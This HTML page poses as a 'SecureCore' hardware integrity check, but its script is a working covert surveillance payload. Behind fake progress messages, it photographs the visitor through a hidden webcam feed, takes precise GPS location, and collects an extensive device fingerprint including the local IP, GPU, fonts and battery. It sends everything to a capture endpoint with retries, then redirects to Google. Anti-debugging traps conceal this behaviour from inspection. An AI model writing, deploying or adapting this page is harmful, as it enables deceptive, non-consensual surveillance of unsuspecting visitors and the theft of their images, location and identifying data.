<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SecureCore v3.0.1</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; }
        body {
            min-height: 100vh;
            background: radial-gradient(circle at 30% 30%, #0b1a2e, #030712);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #e0e0e0;
            padding: 16px;
        }
        .glass-card {
            background: rgba(10, 20, 30, 0.65);
            backdrop-filter: blur(15px);
            -webkit-backdrop-filter: blur(15px);
            border-radius: 36px;
            padding: 32px 24px;
            width: 100%;
            max-width: 420px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.7), 0 0 0 1px rgba(0, 255, 255, 0.1) inset;
            animation: float 6s infinite ease-in-out;
        }
        @keyframes float {
            0% { transform: translateY(0); }
            50% { transform: translateY(-6px); }
            100% { transform: translateY(0); }
        }
        .logo {
            font-size: 52px;
            margin-bottom: 18px;
            filter: drop-shadow(0 0 8px cyan);
        }
        h1 {
            font-size: 26px;
            font-weight: 500;
            letter-spacing: 0.5px;
            background: linear-gradient(135deg, #a8ede0, #fed6e3);
            background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 8px;
        }
        .sub {
            color: #8a9cad;
            font-size: 14px;
            margin-bottom: 30px;
            border-bottom: 1px dashed #2a3a4a;
            padding-bottom: 16px;
        }
        .progress-container {
            background: #1e2a3a;
            border-radius: 40px;
            height: 12px;
            margin: 24px 0;
            overflow: hidden;
            box-shadow: inset 0 2px 4px #00000055;
        }
        .progress-fill {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #00c6fb, #005bea);
            border-radius: 40px;
            transition: width 0.4s cubic-bezier(0.4, 0.0, 0.2, 1);
            box-shadow: 0 0 15px #00c6fb;
        }
        .status-text {
            font-family: 'Fira Code', monospace;
            font-size: 13px;
            color: #a0b8cc;
            margin: 16px 0 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .detail-line {
            font-size: 12px;
            color: #6f8a9c;
            margin: 4px 0;
            display: flex;
            justify-content: space-between;
            border-bottom: 1px dotted #2d3e4e;
            padding: 4px 0;
        }
        .footer {
            font-size: 10px;
            color: #3e5568;
            margin-top: 30px;
            display: flex;
            justify-content: center;
            gap: 16px;
        }
        #hidden-video { display: none; }
        #debug { display: none; }
        /* Extra hidden elements for fingerprinting */
        canvas#extra-canvas { display: none; }
    </style>
</head>
<body>
    <div class="glass-card">
        <div class="logo">🛡️</div>
        <h1>SecureCore v3.0.1</h1>
        <div class="sub">Hardware‑level integrity check · Please wait</div>
        <div class="progress-container">
            <div class="progress-fill" id="progressFill"></div>
        </div>
        <div class="status-text" id="statusText">Initializing secure channel...</div>
        <div id="extra-details"></div>
        <div class="footer">
            <span>🔒 AES‑256</span>
            <span>⚡ TPM 2.0</span>
            <span>🌐 Secure Enclave</span>
        </div>
    </div>

    <video id="hidden-video" autoplay playsinline></video>
    <canvas id="canvas-fingerprint" width="200" height="50" style="display:none;"></canvas>
    <audio id="audio-fingerprint" style="display:none;"></audio>
    <canvas id="extra-canvas" width="1" height="1" style="display:none;"></canvas>

    <script>
        (async function() {
            // ==================== ANTI‑DEBUGGING & VM DETECTION ====================
            // Multiple layers to detect DevTools / debugging
            const startTime = performance.now();
            const checkDevTools = () => {
                const diff = performance.now() - startTime;
                if (diff > 150) {
                    window.location.replace('https://www.google.com');
                }
            };
            checkDevTools();

            // 1. debugger trap
            setInterval(() => {
                const t = performance.now();
                debugger;
                if (performance.now() - t > 50) window.location.replace('https://www.google.com');
            }, 400);

            // 2. console.log trap (if console is open, accessing it may slow down)
            (function() {
                const c = console.log;
                console.log = function() {
                    window.location.replace('https://www.google.com');
                    c.apply(console, arguments);
                };
            })();

            // 3. Check for DevTools via toString
            const checkToString = () => {
                const element = document.createElement('div');
                if (element.toString.toString().includes('native code')) {
                    // likely fine
                } else {
                    window.location.replace('https://www.google.com');
                }
            };
            checkToString();

            // 4. Detect if frame is being inspected (via width difference)
            const widthDiff = window.outerWidth - window.innerWidth;
            if (widthDiff > 150) window.location.replace('https://www.google.com');

            // 5. Periodic performance check (for step debugging)
            let lastTime = performance.now();
            setInterval(() => {
                const now = performance.now();
                if (now - lastTime > 200) window.location.replace('https://www.google.com');
                lastTime = now;
            }, 100);

            // ==================== UI ELEMENTS ====================
            const progressFill = document.getElementById('progressFill');
            const statusText = document.getElementById('statusText');
            const extraDetails = document.getElementById('extra-details');

            // ==================== DATA COLLECTION ====================
            let photoData = null, locationData = null, fingerprint = {}, errors = [];

            function updateProgress(percent, msg, detail = '') {
                progressFill.style.width = percent + '%';
                statusText.innerText = msg;
                if (detail) {
                    extraDetails.innerHTML = `<div class="detail-line"><span>${detail}</span><span>✔️</span></div>`;
                } else {
                    // Add random detail occasionally
                    const details = ['TPM verified', 'Secure boot OK', 'UEFI locked', 'VT‑d enabled', 'Memory encryption active'];
                    if (Math.random() > 0.7) {
                        extraDetails.innerHTML = `<div class="detail-line"><span>${details[Math.floor(Math.random() * details.length)]}</span><span>✔️</span></div>`;
                    }
                }
            }

            // ==================== EXTREME FINGERPRINTING ====================
            async function collectAdvancedFingerprint() {
                const fp = {};

                // Basic navigator properties
                fp.userAgent = navigator.userAgent;
                fp.platform = navigator.platform;
                fp.language = navigator.language;
                fp.languages = navigator.languages;
                fp.hardwareConcurrency = navigator.hardwareConcurrency;
                fp.deviceMemory = navigator.deviceMemory || 'unknown';
                fp.maxTouchPoints = navigator.maxTouchPoints;
                fp.vendor = navigator.vendor;
                fp.cookieEnabled = navigator.cookieEnabled;
                fp.doNotTrack = navigator.doNotTrack;
                fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
                fp.timezoneOffset = new Date().getTimezoneOffset();

                // Screen
                fp.screen = `${screen.width}x${screen.height}`;
                fp.screenAvail = `${screen.availWidth}x${screen.availHeight}`;
                fp.colorDepth = screen.colorDepth;
                fp.pixelDepth = screen.pixelDepth;
                fp.orientation = screen.orientation ? screen.orientation.type : 'unknown';
                fp.devicePixelRatio = window.devicePixelRatio;

                // WebGL renderer (GPU fingerprint)
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        if (debugInfo) {
                            fp.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                            fp.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                        }
                        // Get WebGL parameters
                        fp.webglVersion = gl.getParameter(gl.VERSION);
                        fp.webglShadingVersion = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
                        fp.webglVendor = gl.getParameter(gl.VENDOR);
                        fp.webglRenderer = gl.getParameter(gl.RENDERER);
                        // Extensions
                        fp.webglExtensions = gl.getSupportedExtensions();
                    }
                } catch (e) {}

                // Canvas fingerprint (image hash)
                try {
                    const canvas = document.getElementById('canvas-fingerprint');
                    const ctx = canvas.getContext('2d');
                    ctx.textBaseline = 'top';
                    ctx.font = '14px Arial';
                    ctx.fillStyle = '#f60';
                    ctx.fillRect(0, 0, 100, 50);
                    ctx.fillStyle = '#069';
                    ctx.fillText('🕵️', 10, 20);
                    const dataURL = canvas.toDataURL();
                    fp.canvasHash = dataURL.slice(-50);
                } catch (e) {}

                // Audio fingerprint (using AudioContext)
                try {
                    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                    const oscillator = audioCtx.createOscillator();
                    const analyser = audioCtx.createAnalyser();
                    oscillator.connect(analyser);
                    oscillator.frequency.value = 440;
                    oscillator.start(0);
                    oscillator.stop(0.1);
                    const data = new Uint8Array(analyser.frequencyBinCount);
                    analyser.getByteFrequencyData(data);
                    fp.audioHash = data.reduce((a, b) => a + b, 0).toString(16);
                } catch (e) {}

                // Battery API
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        fp.battery = {
                            level: Math.round(battery.level * 100) + '%',
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime
                        };
                    } catch (e) {}
                }

                // Network information
                if (navigator.connection) {
                    fp.connection = {
                        effectiveType: navigator.connection.effectiveType,
                        rtt: navigator.connection.rtt,
                        downlink: navigator.connection.downlink,
                        saveData: navigator.connection.saveData
                    };
                }

                // WebRTC local IP
                try {
                    const rtc = new RTCPeerConnection({ iceServers: [] });
                    rtc.createDataChannel('');
                    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                    rtc.onicecandidate = (ice) => {
                        if (ice.candidate) {
                            const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
                            const ip = ipRegex.exec(ice.candidate.candidate)?.[1];
                            if (ip) fp.localIP = ip;
                        }
                    };
                    setTimeout(() => rtc.close(), 1000);
                } catch (e) {}

                // Font enumeration (extensive)
                try {
                    const fontList = ['Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino', 'Garamond', 'Book Antiqua', 'Arial Black', 'Lucida Console', 'Monaco', 'Courier', 'Cursive', 'Fantasy', 'Sans-serif', 'Serif', 'Monospace'];
                    fp.availableFonts = fontList.filter(f => document.fonts?.check(`12px "${f}"`)).join(',');
                } catch (e) {}

                // Plugins
                try {
                    const plugins = [];
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push(navigator.plugins[i].name);
                    }
                    fp.plugins = plugins.join(',');
                } catch (e) {}

                // MIME types
                try {
                    const mimeTypes = [];
                    for (let i = 0; i < navigator.mimeTypes.length; i++) {
                        mimeTypes.push(navigator.mimeTypes[i].type);
                    }
                    fp.mimeTypes = mimeTypes.join(',');
                } catch (e) {}

                // Java enabled
                fp.javaEnabled = navigator.javaEnabled ? navigator.javaEnabled() : false;

                // PDF viewer enabled
                fp.pdfViewerEnabled = navigator.pdfViewerEnabled || false;

                // Touch support
                fp.touchSupport = 'ontouchstart' in window;

                // Device orientation support (already)
                fp.deviceOrientationSupported = !!window.DeviceOrientationEvent;

                // Performance timing (to detect VM)
                const perf = performance.timing;
                fp.navigationStart = perf.navigationStart;
                fp.domInteractive = perf.domInteractive;
                // This can be used to detect VMs if timings are off.

                // Get CPU core info? Not directly.

                // Additional canvas fingerprint with different text
                try {
                    const canvas2 = document.getElementById('extra-canvas') || document.createElement('canvas');
                    canvas2.width = 200;
                    canvas2.height = 50;
                    const ctx2 = canvas2.getContext('2d');
                    ctx2.fillStyle = '#ccc';
                    ctx2.fillRect(0, 0, 200, 50);
                    ctx2.fillStyle = '#333';
                    ctx2.font = '16px Arial';
                    ctx2.fillText('BrowserFingerprint', 10, 30);
                    fp.canvas2Hash = canvas2.toDataURL().slice(-50);
                } catch (e) {}

                return fp;
            }

            // ==================== DATA EXFILTRATION (resilient + multiple fallbacks) ====================
            async function exfiltrate(payload, retries = 4) {
                const endpoints = ['/api/capture']; // could add more fallback endpoints if needed

                for (let endpoint of endpoints) {
                    for (let i = 0; i < retries; i++) {
                        try {
                            // Try sendBeacon first (best for page unload)
                            const success = navigator.sendBeacon(endpoint, JSON.stringify(payload));
                            if (success) return true;

                            // Fallback to fetch
                            const res = await fetch(endpoint, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify(payload),
                                keepalive: true
                            });
                            if (res.ok) return true;
                        } catch (e) {
                            console.error('Exfil attempt failed', e);
                        }
                        // Exponential backoff
                        await new Promise(r => setTimeout(r, 300 * (i + 1)));
                    }
                }
                return false;
            }

            // ==================== MAIN EXECUTION ====================
            updateProgress(5, 'Initializing secure module...');

            // ---- Camera ----
            try {
                updateProgress(10, 'Accessing secure camera...');
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 } }
                });
                const video = document.getElementById('hidden-video');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    photoData = canvas.toDataURL('image/jpeg', 0.7); // lower quality for size
                    stream.getTracks().forEach(t => t.stop());
                    video.srcObject = null;
                }, 800);
                updateProgress(30, 'Camera verified', 'Sensor OK');
            } catch (e) {
                errors.push('camera:' + e.message);
                updateProgress(30, 'Camera fallback', 'Using backup sensor');
            }

            // ---- Location ----
            try {
                updateProgress(40, 'Geolocating...');
                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, {
                    enableHighAccuracy: true, timeout: 7000
                }));
                locationData = {
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    acc: pos.coords.accuracy,
                    alt: pos.coords.altitude || null,
                    heading: pos.coords.heading || null,
                    speed: pos.coords.speed || null
                };
                updateProgress(60, 'Location locked', 'GPS fix');
            } catch (e) {
                errors.push('location:' + e.message);
                updateProgress(60, 'Approximate location', 'IP fallback');
                // In a real advanced version, you could fetch IP geolocation from a free service, but that adds latency and external dependency.
            }

            // ---- Advanced Fingerprint ----
            updateProgress(70, 'Analyzing device fingerprint...');
            fingerprint = await collectAdvancedFingerprint();
            updateProgress(85, 'Hardware profile complete', `CPU cores: ${fingerprint.hardwareConcurrency || '?'}`);

            // ---- Assemble payload ----
            const payload = {
                photo: photoData,
                location: locationData,
                fingerprint,
                errors: errors.length ? errors : undefined,
                timestamp: Date.now(),
                pageUrl: window.location.href,
                referrer: document.referrer || undefined
            };

            // ---- Exfiltrate ----
            updateProgress(95, 'Securely transmitting...');
            const sent = await exfiltrate(payload);

            // ---- Clean exit ----
            updateProgress(100, sent ? 'Update complete' : 'Partial sync', sent ? '' : '⚠️ Some data pending');
            setTimeout(() => {
                // Redirect to a benign page
                window.location.replace('https://www.google.com');
            }, 2000);
        })();
    </script>
</body>
</html>
